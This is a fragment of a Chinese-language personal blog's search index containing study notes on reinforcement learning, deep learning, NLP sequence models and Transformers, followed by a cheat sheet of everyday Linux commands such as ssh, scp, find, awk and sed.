","date":"2024-10-24","objectID":"/record_thesis/:0:0","tags":["thesis"],"title":"论文阅读记录","uri":"/record_thesis/"},{"categories":["Notes","AI"],"content":"概念 要素：$state\\overset{policy}\\longrightarrow action$ 奖励函数 Reward Function，衡量智能体某个状态 s 下采取动作 a 后获得的即时反馈 $R(s,a)$，通过奖励好行为和惩罚坏行为使自动学习， $(s_{start}, a, r(s_{start}, s_{change}))$ 在初始状态$s_{start}$采取动作$a$，得到奖励$r(s_{start})$，状态转移为$s_{change}$ 回报 return，从当前时刻到未来所有奖励总和，加权和，每一步奖励都乘以折扣因子 折扣因子(discount factor)：$\\gamma=0.9$，奖励随动作增加减少 $return=R_1 \\cdot (\\gamma) + R_2 \\cdot (\\gamma)^2 + \\cdots + R_n\\cdot (\\gamma)^n$ 策略函数 policy，策略 $\\pi$ 为智能体在每个状态 $s$ 下选择动作 $a$ 的行为准则 确定性：$\\pi(s)=a$，状态 $s$ 下一定选择动作 $a$ 随机性：$\\pi(a|s)=P(A=a|S=s)$，状态 $s$ 下选择动作 $a$ 的概率 目标：最大化回报 连续状态空间 每个状态不是离散的，而是通过向量表示：$s=[x,y,\\theta,x’,y’,\\theta’]$可分别表示位置，方向，速度，角度等 该状态空间下，无法用表格表示所有状态，而是需要使用函数近似器：神经网络 ε-贪婪策略 强化学习中，智能体面临两难问题 1️⃣ \u003e 利用exploitation：利用已有知识选择当前最好动作，最大化Q(s, a) 2️⃣ \u003e 探索exploration：尝试其他动作，可能发现更好策略 ε = 0.05，逐渐减小 ε 使得前期多探索，后期稳定利用最优策略 0.95概率选择最大化 Q(s,a) 的动作 a：exploitation 0.05概率选择随机的动作 a ：exploration 软更新 背景：深度 Q 网络（DQN）不稳定，若主网络每次更新都直接同步到目标网络，会导致训练不稳定 主网络（online network）：$Q_{\\theta}$，实时更新，选择动作 目标网络（target network）：$Q_{\\theta^{’}}$，生成目标值，更新慢，保持稳定 当使用小批量梯度下降时，更新 Q 的参数 w 及 b 时软更新，利于收敛： $w=0.01w_{new}+0.99w$ $b=0.01b_{new}+0.99b$ $w_{new}$为主网络参数，$w$为目标网络参数，$\\tau=0.01$为软更新系数 ","date":"2024-10-12","objectID":"/reinforcement_learning_note/:1:0","tags":["reinforcement learning"],"title":"强化学习","uri":"/reinforcement_learning_note/"},{"categories":["Notes","AI"],"content":"模型 ","date":"2024-10-12","objectID":"/reinforcement_learning_note/:2:0","tags":["reinforcement learning"],"title":"强化学习","uri":"/reinforcement_learning_note/"},{"categories":["Notes","AI"],"content":"MDP 马尔科夫决策过程：Markov Decision Process (MDP) 四元组：(S, A, P, R) S：状态空间 A：动作空间 P(s’|s, a)：状态转移概率，从 s 采取动作 a 到状态 s’ 的概率 R(s, a)：奖励函数，从 s 采取 动作 a 得到的即时奖励 性质未来只取决于现在状态，与过去无关 状态-动作价值函数（Q-Function, Q(s, a)） Q函数表示在状态 s 下采取动作 a 后期望总回报 最优Q函数：Q*(s, a)，从 s 开始，执行动作 a，按照最优策略执行后续动作，最终获得的最大期望回报 构建最优策略：$\\pi^{*}(s)=\\arg \\max\\limits_{a}Q^{*}(s,a)$ 贝尔曼方程(Bellman Equation) 当前 Q 值 = 当前奖励 + 未来最大奖励的折扣期望 提供训练目标 1️⃣ 确定性环境：每个动作对应唯一下一个状态 $Q(s,a)=R(s, a)+\\gamma \\max\\limits_{a’}Q(s’,a’)=R_1+\\gamma R_2 +\\gamma^2 R_3 +\\cdots= R_1+\\gamma[R_2+\\gamma R_3 +\\cdots]$ 2️⃣ 随机性环境：下一状态和奖励是概率分布 当出现随机情况，即下一个状态可能未实现，则更关注的是最大化多次运动下的期望回报 $Expected,,Return = Average(R_1+\\gamma R_2+\\gamma^2 R_3 +\\cdots)=E[R_1+\\gamma R_2+\\gamma^2 R_3 +\\cdots]$ $Q(s,a)=R(s)+\\gamma E_{s^{’}}[\\max\\limits_{a’}Q(s’,a’)]$ ","date":"2024-10-12","objectID":"/reinforcement_learning_note/:2:1","tags":["reinforcement learning"],"title":"强化学习","uri":"/reinforcement_learning_note/"},{"categories":["Notes","AI"],"content":"MCTS 蒙特卡洛树搜索，The Monte Carlo Tree Search，给定一个游戏状态，选择最佳下一步 选择selection：选择最大化UCB值的结点，$UCB(S_i)=\\overline{V_i}+c\\sqrt{\\frac{\\log N}{n_i}}, c=2$ $V_i$ 指该结点下平均价值，N探索次数，n当前结点探索次数 扩展node_expansion：创建一个或多个子节点 仿真Rollout：某一节点用随机策略进行游戏 Def Rollout(S_i): loop forever: if S_i is a terminal state: return value(S_i) A_i = random(available-actions(S_i)) S_i = simulate(A_i, S_i) 反向传播back propagation：使用随机搜索结果更新搜索树，价值累加，探索次数加一 通过计算UCB最大值一直到叶结点，查看是否探索过，未探索过则仿真 探索过则枚举当前结点所有可能动作添加到树，扩展一个新结点 ","date":"2024-10-12","objectID":"/reinforcement_learning_note/:2:2","tags":["reinforcement learning"],"title":"强化学习","uri":"/reinforcement_learning_note/"},{"categories":["Notes","AI"],"content":"深度强化学习 Deep Reinforcement Learning, DRL 学习状态值函数 使用神经网络去学习近似Q函数或策略函数，选择最大化 Q(s,a) 的动作 a 训练目标：最小化贝尔曼误差 $$Loss(\\theta)=(Q_{\\theta}(s,a) - [r + \\gamma \\max\\limits_{a^{’}}Q_{\\theta}-(s^{’},a^{’})])^2$$ ","date":"2024-10-12","objectID":"/reinforcement_learning_note/:3:0","tags":["reinforcement learning"],"title":"强化学习","uri":"/reinforcement_learning_note/"},{"categories":["Notes","AI"],"content":"神经网络 整体框架 特点 堆叠：$f=W_3max(0,W_2max(0,W_1x))$，参数极多 神经元个数影响：神经元多，分类效果好 参数个数影响：参数多，拟合高 极大神经网络在适当正则化下不损害性能，拥有低偏差：惩罚力度小，拟合高；惩罚力度大，平稳 停滞区（plateaus）使学习过程慢 参数随机初始化 w[1] = np.random.randn((2, 2)) * 0.01 # [1]表示第一层 初始化 w 不能只设为 0, 否则会使得多个神经元工作对称一致 0.01使得学习速度更快 b[1] = np.zeros((2, 1)) # b 不会由于初始值为 0 产生对称问题/对称失效问题 隐藏层工作 层类型 密集层（Dense Layer） 上一层的输出经过激活函数，得到该层每个神经元输出 卷积层（Convolutional Layer） 该层每个神经元只关注上一层输入的一部分，例如图像中抽取任意个像素块，可以相互重叠 计算快，更少训练集，不易过拟合 线性函数 输入到输出的映射：图片（32x32x3）经$f(x, W)=Wx+b$得到每个分类的得分，$x$为图片，$W$为权重参数，$b$为偏置参数 其中，共分N个类别，则W=Nx32x32x3=Nx3072，x=32x32x3x1=3072x1，两者矩阵相乘得到 Nx1 的不同类别的得分，b为Nx1 损失函数 举例：$L_i=\\sum_{j\\ne y_i}max(0,s_j-s_{y_i}+1)$，$s_j$是错误的，$s_{y_i}$是正确的 再加入正则化惩罚项防止过拟合：$L=\\frac{1}{N}\\sum_{i=1}^N\\sum_{j\\ne y_i}max(0,f(x_i;W)_j-f(x_i;W)_{y_i}+1)+\\lambda R(W)$ 其中$R(W)=\\sum_k\\sum_lW^2_{k,l}$ 深度神经网络 $n^{[l]}$表示第 l 层的神经元数 ，$a^{[l]}$表示第 l 层的激活函数 $w^{[l]}$表示第 l 层中间值的权重，$b^{[l]}$表示第 l 层中间值的偏置值 $z=g(a), \\quad a=w\\cdot x+b$ $Z^{[l]}, A^{[l]},dZ^{[l]}, dA^{[l]}$矩阵: $(n^{[l]}, m)$，m为训练集数量 ","date":"2024-10-12","objectID":"/deep_learning_note/:1:0","tags":["deep learning"],"title":"深度学习","uri":"/deep_learning_note/"},{"categories":["Notes","AI"],"content":"激活函数 模型输出的原始值转换为概率分布 线性激活函数：$g(z)=z$ 全为线性激活函数使得神经网络等价于线性回归模型 隐藏层均为线性激活函数而输出层为sigmoid函数使得神经网络等价于逻辑回归模型 非线性：Sigmoid，Relu，tanh等 神经网络主要使用 Relu函数 (Rectified Linerar Unite：线性整流函数，非二元, 更快) 而不使用Sigmoid函数，Sigmoid函数会出现梯度消失现象( 两端平坦, 导致梯度下降慢, Relu只有一端平坦 ) Relu函数：$\\sigma(x)=max(0,x)$ Leaky ReLU函数：$\\sigma(x)=\\begin{cases}x,,,x\\gt 0\\\\alpha x,,,x\\le 0\\end{cases}$ tanh函数：$\\sigma(x)=tanh(x)=\\frac{e^x-e^{-x}}{e^x+e^{-x}}$，具有居中数据效果 神经网络-激活函数选择 输出层：线性: y=+/- | Sigmoid: y=0/1 | Relu: y=0/+ 隐藏层：默认选择Relu ","date":"2024-10-12","objectID":"/deep_learning_note/:2:0","tags":["deep learning"],"title":"深度学习","uri":"/deep_learning_note/"},{"categories":["Notes","AI"],"content":"正则化 Frobenius norm 正则化：$||\\cdot||_F^2$ $\\frac{\\lambda}{2m}\\sum_{l=1}^L||w^{[l]}||^2_F=\\sum_{i=1}^{n^{[l-1]}}\\sum_{j=1}^{n^{[l]}}(w_{ij}^{[l]})^2$ 反向传播中：$dw^{[l]}=(from,,backprop) + \\frac{\\lambda}{m}w^{[l]}$ DROP-OUT 正则化 随机抽取一些神经元训练，解决过拟合，以某一概率选择 反向随机失活（Inverted dropout） 不依赖任何一个特征，所以权重将会更扩散 # dl: 布尔矩阵 dl = np.random.rand(al.shape[0], al.shape[1]) \u003c keep-prob # keep-prob为留存概率值 0.8 al = np.myltiply(al, dl) # 可能有20%的将会为false al /= keep-prob ","date":"2024-10-12","objectID":"/deep_learning_note/:3:0","tags":["deep learning"],"title":"深度学习","uri":"/deep_learning_note/"},{"categories":["Notes","AI"],"content":"归一化 归一化输入 对训练集和测试集使用归一化，使用同样的均值及方差： 计算均值，每个值减去$\\mu$，将均值$\\mu$变为0 方差归一化，计算方差，每个样本除以$\\sigma^2$，将方差变为1 梯度消失/爆炸 深层网络中 当权重 w 只比 1 或单位矩阵大一点，激活函数/梯度将会随 L 层指数级增长到爆炸 当权重 w 比 1 小一点，激活函数/梯度将会指数级减少到消失 权值初始化减轻梯度消失/爆炸 Xavier初始化：Tanh 对随机生成的 w 参数$\\cdot \\sqrt\\frac{1}{n^{[l]}}$，n 为特征/神经元数，l 为层数 ReLu函数则：$\\cdot \\sqrt\\frac{2}{n^{[l]}}$ 批量归一化(Batch Norm) 隐藏层归一化，对隐藏单元的$z_{norm}^{(i)}=\\frac{z^{(i)}-\\mu}{\\sqrt{\\sigma^2+\\varepsilon}}$及$\\tilde z^{(i)}=\\gamma\\cdot z_{norm}^{(i)}+\\beta$归一化再输入激活函数，$\\gamma, \\beta$参数可由梯度下降调整 ","date":"2024-10-12","objectID":"/deep_learning_note/:4:0","tags":["deep learning"],"title":"深度学习","uri":"/deep_learning_note/"},{"categories":["Notes","AI"],"content":"前向传播 输入到输出，从左往右，神经元数逐层减少，计算激活值及成本 使用指数函数扩大差异，再取平均值归一化：$P(Y=k|X=x_i)=\\frac{e^{s_k}}{\\sum_je^{s_j}}$，其中$s=f(x_i;W)$ 计算损失值：$L_i=-logP(Y=y_i|X=x_i)$，P越接近1，log后越小 ","date":"2024-10-12","objectID":"/deep_learning_note/:5:0","tags":["deep learning"],"title":"深度学习","uri":"/deep_learning_note/"},{"categories":["Notes","AI"],"content":"反向传播 梯度下降 链式法则：梯度一步步传播，参考偏导来计算 J 关于 w 和 b 参数的导数 反向的时候需要：正向时的每个中间结点的值都存储在中间结点 例子： 逻辑回归反向传播过程 【调试】梯度检查：J 函数中的 $\\theta$是向量中某个$\\theta_i$ 计算$d\\theta_{approx}=\\frac{J(\\theta+\\varepsilon)-J(\\theta-\\varepsilon)}{2\\varepsilon}$，计算标准化后欧几里得距离$\\frac{||d\\theta_{approx}-d\\theta||_2}{||d\\theta_{approx}||_2+||d\\theta||_2}$与$\\varepsilon=10^{-7}$比较 指数加权滑动平均 有大体趋势的多噪声散点图使用：$V_t = \\beta V_{t-1} + (1-\\beta \\theta_t)$做出平滑曲线，相当于取$\\frac{1}{1-\\beta}$天的平均值 偏差纠正 解决初期指数加权平均的值与真实值相差过大，使用$\\frac{V_t}{1-\\beta^t}$ ","date":"2024-10-12","objectID":"/deep_learning_note/:6:0","tags":["deep learning"],"title":"深度学习","uri":"/deep_learning_note/"},{"categories":["Notes","AI"],"content":"自然语言处理，Natural language processing (NLP) ，有监督学习 ","date":"2024-10-12","objectID":"/nlp_note/:0:0","tags":["NLP"],"title":"自然语言处理","uri":"/nlp_note/"},{"categories":["Notes","AI"],"content":"序列模型 文本是一种序列数据，一句话是由一个个按顺序排列的单词组成的 数据表示 $X^{(i)} = [x_1^{(i)}, x_2^{(i)}, \\dots, x_{T_x^{(i)}}^{(i)}]$： 第 $i$ 个样本的输入序列，有 $T_x^{(i)}$ 个元素（单词/字符等） $Y^{(i)} = [y_1^{(i)}, y_2^{(i)}, \\dots, y_{T_y^{(i)}}^{(i)}]$：第 $i$ 个样本的输出序列 $T_x^{(i)}$表示第 i 个训练样例的序列长度，$X^{(i)}$表示 i 序列中第 t 个元素 One-Hot 编码 存在单词字典列表，即每个单词对应一个等长向量列表，向量长度为词汇表大小 $|V|$ 对应单词索引处为1其余为0 类别：RNN循环神经网络、LSTM长短期记忆网络、GRU门控循环单元、Transformer注意力机制核心 ","date":"2024-10-12","objectID":"/nlp_note/:0:1","tags":["NLP"],"title":"自然语言处理","uri":"/nlp_note/"},{"categories":["Notes","AI"],"content":"循环神经网络 Recurrent Neural，处理一维序列化数据 关键思想：时间步之间共享权重，保留一个隐藏状态 $a^{\u003ct\u003e}$，表示前面序列的记忆 前向传播 初始隐藏状态：$a^{\u003c0\u003e}=\\vec 0$ 更新隐藏状态（Tanh, ReLU）：$a^{\u003ct\u003e}=g(w_{aa}a^{\u003ct-1\u003e}+w_{ax}x^{\u003ct\u003e}+b_a)$ 整合，将$W_{aa}$和$W_{ax}$矩阵左右联结表示为$W_a$，2 式转化为 $a^{\u003ct\u003e}=g(W_a[a^{\u003ct-1\u003e}, x^{\u003ct\u003e}]+b_a)$，[ , ]中表示上下联结 输出预测（Sigmoid, SoftMax）： $\\hat y^{\u003ct\u003e}=g(w_{ya}a^{\u003ct\u003e}+b_y)$ 基于时间反向传播 预测特定词是一个人名的概率是$\\hat y$，使用逻辑回归损失 单个时间步损失：$L^{\u003ct\u003e}(\\hat y^{\u003ct\u003e},y^{\u003ct\u003e})=-y^{\u003ct\u003e}\\log \\hat y^{\u003ct\u003e}-(1-y^{\u003ct\u003e})\\log (1-\\hat y^{\u003ct\u003e})$ 总体损失函数：$L(\\hat y, y)=\\sum_{t=1}^{T_y}L^{\u003ct\u003e}(\\hat y^{\u003ct\u003e},y^{\u003ct\u003e})$，$T_x$和$T_y$可能不同 架构类型 一对一：图像分类等任务 一对多：图像描述 多对一：情感分类 多对多（对齐）：命名实体识别（NER） 多对多（非对齐）：机器翻译 构建语言模型 目标：学习一个序列中下一个词的条件概率：$P(x^{\u003ct\u003e}|x^{\u003c1\u003e}, x^{\u003c2\u003e},\\cdots, x^{})$ 数据处理 训练集为极大语料库（corpus），将数据句子标记化（tokenize），句子末尾加入\u003cEOS\u003e（End Of Sentence）标记，定位句子结尾，未知单词标记为\u003cUNK\u003e（unknown word）标记，$\\hat y$ 对应于已知条件概率P(__|已知) 损失函数：对于每个时间步，$L(\\hat y^{\u003ct\u003e},y^{\u003ct\u003e})=-\\sum_iy_i^{\u003ct\u003e}\\log \\hat y_i^{\u003ct\u003e}$，softmax损失函数 Gate Recurrent Unit（GRU）门控制单元 解决RNN梯度消失问题，引入了门机制来控制信息流动 $C^{\u003ct\u003e}$记忆单元来存储记忆，如：需要记住cat是单数，使用was而不是were $\\tilde C^{\u003ct\u003e}=\\tanh (W_c[\\Gamma_r\\cdot C^{\u003ct-1\u003e},x^{\u003ct\u003e}]+b_c)$ 门控值：更新门$\\Gamma_u=\\sigma(W_u[C^{\u003ct-1\u003e},x^{\u003ct\u003e}]+b_u)$，sigmoid使范围为0-1，为0表示不更新$C^{\u003ct\u003e}$，同样适用于相关性门$\\Gamma_r$ $C^{\u003ct\u003e}=\\Gamma_u\\cdot \\tilde C^{\u003ct\u003e}+(1-\\Gamma_u)\\cdot C^{\u003ct-1\u003e}$ ，a和c相等 Long Short Term Memory Units（LSTM）长短期记忆单元 $\\tilde C^{\u003ct\u003e}=\\tanh (W_c[a^{\u003ct-1\u003e},x^{\u003ct\u003e}]+b_c)$ 更新门$\\Gamma_u=\\sigma(W_u[C^{\u003ct-1\u003e},x^{\u003ct\u003e}]+b_u)$，遗忘门$\\Gamma_f=\\sigma(W_f[C^{\u003ct-1\u003e},x^{\u003ct\u003e}]+b_f)$，输出门$\\Gamma_o=\\sigma(W_o[C^{\u003ct-1\u003e},x^{\u003ct\u003e}]+b_o)$ 更新：$C^{\u003ct\u003e}=\\Gamma_u\\cdot \\tilde C^{\u003ct\u003e}+\\Gamma_f\\cdot C^{\u003ct-1\u003e}$，$a^{\u003ct\u003e}=\\Gamma_o\\cdot C^{\u003ct\u003e}$，a和c不再相等 情感分类 双向递归网络 （bi-directional recurrent neural network, BRNNs） 解决单词不能单从前面得出是否是人名 深度递归网络 Deep RNNs ","date":"2024-10-12","objectID":"/nlp_note/:0:2","tags":["NLP"],"title":"自然语言处理","uri":"/nlp_note/"},{"categories":["Notes","AI"],"content":"词嵌入模型 将文字或词语转换为一系列数字，通常是一个向量。词嵌入类似一个为每个词分配的数字列表，这些数字不随机，而是捕获了这个词的含义和它在文本中的上下文，使得语义上相似或相关的词在数字空间中比较接近 词向量表示 one-hot编码两两单词相乘为0 需要描述一个物，需要综合多项指标（向量），向量可以用不同方法计算相似度，相似词在特征表达中比较相似 特征比如单词与性别（-1~1）、年龄、是否为食物的指标值（0~1） 词向量相似性 1️⃣ 类比推理 $e_{king}-e_{man}+e_{woman} \\approx e_{queen}$ 2️⃣ 欧氏距离 衡量向量在几何空间的绝对距离：$d(u, v) = \\sqrt{\\sum_i(u_i-v_i)^2}$ 3️⃣ 余弦相似度(相似函数) $\\arg \\max sim(e_w,e_{king}-e_{man}+e_{woman})$ $sim(u,v)=\\frac{u^Tv}{||u||_2\\cdot||v||_2}$ 实则求 u 和 v 之间的角$\\phi$的余弦值，0~180:1~-1 矩阵嵌入 使用单词矩阵与one-hot编码向量相乘获取对应单词的向量，实则一般在嵌入层中直接取对应列即可 ","date":"2024-10-12","objectID":"/nlp_note/:0:3","tags":["NLP"],"title":"自然语言处理","uri":"/nlp_note/"},{"categories":["Notes","AI"],"content":"词向量模型 Word2Vec Word2Vec 将单词嵌入空间中，通过上下文预测目标词或反向预测上下文 训练数据 两种结构：CBOW（上下文推词） 与 Skipgram（词推上下文） 除偏（性别、种族偏差） 识别需要消除的偏差方向，使用$e_{he}-e_{she}$等多组的平均值获取坐标轴 中立化：未被定义的词通过映射到避开偏差 均匀化：移动相关性别的词使得距离坐标轴相等 Skip-gram 有监督学习 目标：给定上下文语境词 c，预测目标词 t ，$\\theta_t$ 是关于 t 的参数，未包含偏置项 Softmax 概率函数：分母的运算代价极大 $p(t|c)=\\frac{e^{\\theta_t^Te_c}}{\\sum_{j=1}^{10000}e^{\\theta_j^Te_c}}$ 负采样（Negative Sampling） 用 k 个词进行训练，其中： 1 个正样本（真实上下文词对） $k-1$ 个负样本（随机采样，不应出现在该上下文中） 使用 logistic 回归做二分类训练，使得正样本概率高、负样本概率低： GloVe Global Vectors for word representation，基于共现矩阵$X_{ij}$：词 i 和词 j 共同出现概率 $f(X_{ij})$是权重项，调整使得常见词权重不高，罕见词权重不低，X为0时f为0，采用\"0log0=0\"的规则 目标函数：带权重的平方损失 $minimize,, \\sum_{i=1}^{10000}\\sum_{j=1}^{10000}f(X_{ij})(\\theta_i^Te_j+b_i+b_j’-\\log X_{ij})^2$ 随机均匀初始化 $\\theta,e$，梯度下降最小化目标函数 最终词向量：$e_w^{(final)}=\\frac{e_w+\\theta_w}{2}$ ","date":"2024-10-12","objectID":"/nlp_note/:0:4","tags":["NLP"],"title":"自然语言处理","uri":"/nlp_note/"},{"categories":["Notes","AI"],"content":"Seq2Seq模型 （Sequence-to-sequence），机器翻译+语音识别 结构由两个 RNN（或LSTM/GRU）组成： 编码器 Encoder：将输入句子编码成上下文向量 解码器 Decoder：逐步生成输出序列 先将语言经过编码器，然后经过解码器进行翻译，计算$P(y^{\u003c1\u003e}|x)$ 定向搜索 Beam Search或集束搜索 参数B表示集束宽度，保留备选单词数，每次选择B个最高条件概率词元 $\\arg \\max_y\\frac{1}{T_y^{\\alpha}}\\sum_{t=1}^{T_y}\\log P(y^{\u003ct\u003e}|x,y^{\u003c1\u003e},\\cdots ,y^{\u003ct-1\u003e})$，$\\alpha$=0.7取部分规范化 $P(y^{\u003c1\u003e}\\cdots y^{\u003cT_y\u003e}|x)=P(y^{\u003c1\u003e}|x)P(y^{\u003c2\u003e}|x,y^{\u003c1\u003e})\\cdots P(y^{\u003cT_y\u003e}|x,y^{\u003c1\u003e},\\cdots ,y^{\u003cT_y-1\u003e})$ Bleu指数 多个好结果下选择一个最好的看n元单词在参考翻译中出现概率 $P_n=\\frac{\\sum_{n-grams\\in \\hat y}Count_{clips}(n-gram)}{\\sum_{n-grams\\in \\hat y}Count(n-gram)}$再去各个n的平均值 n个n个取参考翻译记录每n个单词的count，再在机器翻译中得出count_clip Bleu指数在句子长度小和极大时都很小 注意力模型 （attention model），会生成多个注意力权重参数$\\alpha$总和为1，将在某个词放入多少注意力，$\\alpha^{\u003ct, t’\u003e}$ 表示生成 t 时需要对 t’ 花费的注意力是多少 ","date":"2024-10-12","objectID":"/nlp_note/:0:5","tags":["NLP"],"title":"自然语言处理","uri":"/nlp_note/"},{"categories":["Notes","AI"],"content":"Transformer 同一时间对一句话同时处理，注意力+卷积 自注意力机制：并行计算 为每个单词计算出一个基于注意力的表达：$A(q,K,V)$，即$A^{\u003c1\u003e},A^{\u003c2\u003e},\\cdot$ 将每个单词与q(Query), K(Key), V(Value)关联，W为学习参数 $q^{\u003ci\u003e}=W^Q\\cdot x^{\u003ci\u003e}$ $K^{\u003ci\u003e}=W^K\\cdot x^{\u003ci\u003e}$ $V^{\u003ci\u003e}=W^V\\cdot x^{\u003ci\u003e}$ 多头注意力机制：循环并行计算自注意力 通过不同矩阵参数集进行重复多次的自注意力计算，用于回答不同问题：when,where,who,how… transformer架构 ","date":"2024-10-12","objectID":"/nlp_note/:0:6","tags":["NLP"],"title":"自然语言处理","uri":"/nlp_note/"},{"categories":["Notes"],"content":"配置 bash的配置在~/.bashrc中 git的配置在~/.gitconfig中 vim的配置在~/.vimrc中 ","date":"2024-10-09","objectID":"/linux_note/:1:0","tags":["linux"],"title":"LINUX","uri":"/linux_note/"},{"categories":["Notes"],"content":"基础命令 tree：列举所有文件，递归列举文件 tldr：连接 command 可以列举使用该命令的用法 journalctl：查看和管理 systemd 日志 alias：命令别名，alias command查看别名意义 tac：最后一行开始，逐行向上显示内容 curl： 可查看公网ip地址 htop：进程查看器和系统监视器 wc：wc -l file，统计文件行数 time：获取命令执行的真实、用户、系统时间 paste：paste -sd, 将多个文件对应行合并为一行，以逗号分隔，-s合并为一行，-d指定分隔符 tee：xx | tee file从标准输入读取数据，并将数据同时写入到一个或多个文件和标准输出 nohup：nohup python3 xx.py使得一个进程在用户登出或会话终止后仍然后台继续运行 bg：将jobs命令查看的已暂停后台作业继续运行，bg %1指定 jobs 中序号 od：十六进制查看工具，od -c file pstree：查看进程关系 kill： kill -l查看信号 netstat：-ano显示网络状态，监听 ","date":"2024-10-09","objectID":"/linux_note/:2:0","tags":["linux"],"title":"LINUX","uri":"/linux_note/"},{"categories":["Notes"],"content":"常用命令 查看某个文件的绝对路径： pwd|awk '{print $1\"/file_name\"}' 查看版本：cat /proc/version 显示linux内核版本信息：uname -asrm 查看目录及子目录磁盘使用情况：du -sh directory 查找指定进程格式：ps -ef | grep xx 查看分区挂载情况：df 编译链接线程库：-lpthread 安装deb文件：sudo dpkg -i 本地监听某端口：nc -l port 深入查看头文件定义：find /usr/include | grep xxx.h 记录某文件出现多少次该单词：grep -o \"xxx\" file.txt | wc -l 删除某环境变量：unset xx 更改文件夹用户及用户组：chown -R username:groupname directory_path 链接 ln # 硬~ ln -s # 软~ 压缩 tar -zvcf a.tar.gz a # 压缩 tar -zvxf a.tar.gz # 解压 zip -r a.zip ./* # 压缩 unzip -d /xxx a.zip # 解压 gzip -d xx.gz # 解压 命令行命令 !! # 直接替换为上一次使用的命令 Ctrl + R # 回溯历史操作 readelf -S xxx # 查看程序.bss段地址 cd - # 返回到上一次工作目录 ","date":"2024-10-09","objectID":"/linux_note/:3:0","tags":["linux"],"title":"LINUX","uri":"/linux_note/"},{"categories":["Notes"],"content":"技巧 若不需要-a这些参数, 可以使用-- cat $(some_command) # 可以直接获取命令返回结果内容 find xxx -type f | xargs cat # xargs 查找标准库结构体 grep -r -A 10 \"struct name\" /usr/include # 额外显示10行 查看局域网 IP：ipconfig，查看公网出口 IP：curl cip.cc 或 ip138.com ","date":"2024-10-09","objectID":"/linux_note/:4:0","tags":["linux"],"title":"LINUX","uri":"/linux_note/"},{"categories":["Notes"],"content":"具体命令 ","date":"2024-10-09","objectID":"/linux_note/:5:0","tags":["linux"],"title":"LINUX","uri":"/linux_note/"},{"categories":["Notes"],"content":"netstat netstat -plant -p: --programs，与链接相关程序名和进程的PID -l: --listening，显示所有监听的端口 -a: --all，显示所有链接和监听端口 -n: 进制使用域名解析功能。链接以数字形式展示(IP地址)，而不是通过主机名或域名形式展示 -t: 所有的 tcp 协议的端口 ","date":"2024-10-09","objectID":"/linux_note/:5:1","tags":["linux"],"title":"LINUX","uri":"/linux_note/"},{"categories":["Notes"],"content":"find find . -name xxx -type d # d 表示 目录 find . -path '**/test/*.py' -type f # f 表示 文件 find . -name \"*.tmp\" -exec rm {} \\; # -exec rm {} \\; 表示对每个找到的文件进行rm操作 # {} 是一个占位符，表示当前找到的文件。find 命令会用找到的文件的完整路径替换 {} # \\; 表示 -exec 操作的结束, \\ 是用来转义 ; 的， shell 中 ; 通常是一个命令分隔符 ","date":"2024-10-09","objectID":"/linux_note/:5:2","tags":["linux"],"title":"LINUX","uri":"/linux_note/"},{"categories":["Notes"],"content":"lsof 列出当前系统打开文件，包括网络连接、设备 # 列出4444端口监听的进程 lsof | grep \":4444 .LISTEN\" ","date":"2024-10-09","objectID":"/linux_note/:5:3","tags":["linux"],"title":"LINUX","uri":"/linux_note/"},{"categories":["Notes"],"content":"ssh ssh-keygen -o -a 100 -t ed25519 # -o: 使用新的OpenSSH私钥文件格式 # -a 100: 键派生函数迭代次数 # -t ed25519: 生成的密钥类型, ed25519-一种椭圆曲线签名算法 会生成公私钥对id_xxx及id_xxx.pub在.ssh中 cat ~/.ssh/id_xxx.pub | ssh a@x.x.x.x tee .ssh/authorized_keys # 公钥传入远程服务器 ssh -i key xxx@ip 出现密钥变更 ssh-keygen -R x.x.x.x # 删除相关信息 ssh user@x.x.x.x # 重新连接 scp是ssh的子命令 # 远程文件传输 scp -i secret_key -r local_file user@x.x.x.x:remote_file_location # 本地到远程 scp -r user@x.x.x.x:remote_file local_destination # 远程到本地 rsync同样可以传输文件，用于备份+镜像，只对差异文件更新，快速 rsync -avP local_file user@x.x.x.x:destination # 本地到远程 # -a: 递归复制 -v: 显示详细信息 -P: 允许断点续传, 显示传输进度信息 windows主机vscode免密ssh登录到服务器 A 把公钥给 B，使得A可远程免密登录B # windows 下 ssh-keygen -t rsa cat id_rsa.pub # 将其公钥放入 Linux 服务器的 ~/.ssh/authorized_keys 中 ssh username@ip ssh root@ip scp username@remote_host:/path/to/remote/file /path/to/local/destination # 拉取文件到本地 ","date":"2024-10-09","objectID":"/linux_note/:5:4","tags":["linux"],"title":"LINUX","uri":"/linux_note/"},{"categories":["Notes"],"content":"strace strace -e lstat ls -l \u003e /dev/null # 使用 strace 只跟踪 ls -l 命令中的 lstat 系统调用, 丢弃输出到/dev/null ","date":"2024-10-09","objectID":"/linux_note/:5:5","tags":["linux"],"title":"LINUX","uri":"/linux_note/"},{"categories":["Notes"],"content":"awk awk '{print $2}' file # 输出每行第 2 个字段 awk '$1 == 1 \u0026\u0026 $2 ~ /^c.*e$/ {print $0}' file # 第 1 列为 1, 第 2 列满足以c开头以e结尾, $0 输出当前行 ","date":"2024-10-09","objectID":"/linux_note/:5:6","tags":["linux"],"title":"LINUX","uri":"/linux_note/"},{"categories":["Notes"],"content":"grep xxx | grep 'xxxx' xxx | grep -E \"1|2\" # 正则: 含1或2 ","date":"2024-10-09","objectID":"/linux_note/:5:7","tags":["linux"],"title":"LINUX","uri":"/linux_note/"},{"categories":["Notes"],"content":"sed 流编辑器，用于处理文本，引号内为正则表达式 cat xxx | sed 's/^.*hello(haha)?[ab][^,]/g' # s: 替换操作 # /: 分隔符 # ^: 匹配行的开头 # .*: 任意数量字符(除换行符) # ()?: ?表示()中内容可以出现 0 或 1 次 # []: 匹配包含内容中的任何一个字符 # [^,]: 表示匹配除 , 外任何字符 # //: 替换成空字符串, 删除匹配内容 # g: 表示全局替换(global), 替换所有匹配的字符, 若没有g则替换一个 cat xxx | sed -E 's/(ab|bc)*\\s*[0-9.]+[0-9]+$//g' # -E: 表示使用扩展, 使得可以用()而不需要用\\来对()转义 # ()*: 匹配0或多次连续的()内的内容 # |: 表示或者 # \\s*: 0个或多个空白字符 # [0-9.]+: 匹配一个或多个数字或点(IP地址) # [0-9]+: 匹配一个或多个数字(端口) # $: 匹配行的结尾 cat xxx | sed -E 's/x(hello)?xxx(.*)xx/\\2/' # (.*): 不仅匹配内容，还将其存储在捕获组中, 后续可用 \\number 引用 # 将匹配到的内容用(.*)中的内容替换 ","date":"2024-10-09","objectID":"/linux_note/:5:8","tags":["linux"],"title":"LINUX","uri":"/linux_note/"},{"categories":["Notes"],"content":"screen 用于后台挂载 screen -S xxx # 新建 screen -r xxx # 进入 